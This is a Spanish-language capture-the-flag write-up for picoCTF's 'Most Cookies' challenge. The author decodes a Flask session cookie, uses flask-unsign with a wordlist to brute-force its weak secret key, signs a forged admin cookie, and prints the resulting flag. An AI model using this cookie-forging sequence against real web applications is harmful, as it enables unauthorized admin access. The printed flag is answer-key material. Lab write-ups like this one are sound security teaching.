## Most Cookies

## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:63016/
## Solucion
al abrir la pagina del reto nos abre un archivo de texto y nos pide que le digamos un nombre de una galleta, usamos el que tiene de ejemplo ahi snickerdoodle y se crea una cookie llamada session con lo siguiente:
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaejDw.fGQSTUTfPMCcGvPOXIuJcdvZZu4
ahora con la herramienta flask-unsign vamos a descubrir que secret key tiene para poder obtener la bandera:
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ flask-unsign --decode --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaejDw.fGQSTUTfPMCcGvPOXIuJcdvZZu4
{'very_auth': 'snickerdoodle'}

┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ flask-unsign --wordlist cookies.txt --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aaejDw.fGQSTUTfPMCcGvPOXIuJcdvZZu4
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 38 attempts
'thumbprint'
```
vemos que la secret key que usa es thumbprint ahora vamos a hacer una nueva cookie para el admin 
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'thumbprint'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aaemug.cUeZHa6CvKnRnw_095VCOG3M3E4
```
la clave que nos da la metemos en el navegador en la cookie recargamos la pagina y nos dice este mensaje:
**Flag**: `picoCTF{cO0ki3s_yum_485f560e}`
## Notas
- 
## Referencias
- 